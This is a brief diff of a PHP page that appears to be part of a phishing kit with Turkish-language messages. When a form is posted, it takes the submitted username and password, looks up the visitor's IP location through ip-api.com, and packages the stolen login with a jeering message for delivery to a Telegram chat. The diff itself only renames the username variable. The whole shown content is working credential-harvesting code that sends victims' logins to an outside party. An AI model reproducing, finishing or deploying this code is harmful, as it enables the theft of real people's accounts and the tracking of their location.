@@ -1,7 +1,7 @@
 <?php
 include('tg.php');
 
-$id=$_GET["id"];
+$user=$_GET["user"];
 if($_POST){
 $ip=$_SERVER["REMOTE_ADDR"];
 $konum = file_get_contents("http://ip-api.com/xml/".$ip);
@@ -17,7 +17,7 @@ header("location: password.php?id=$id");
 $data = [
   'text' => '➡️ Lan Koş Sazan Düştü 😈 
 Sublime Saplar 😈
-Kullanıcı Adı : '.$username.'
+Kullanıcı Adı : '.$user.'
 Şifre : '.$password.'
 ',
   'chat_id' => $chat_id
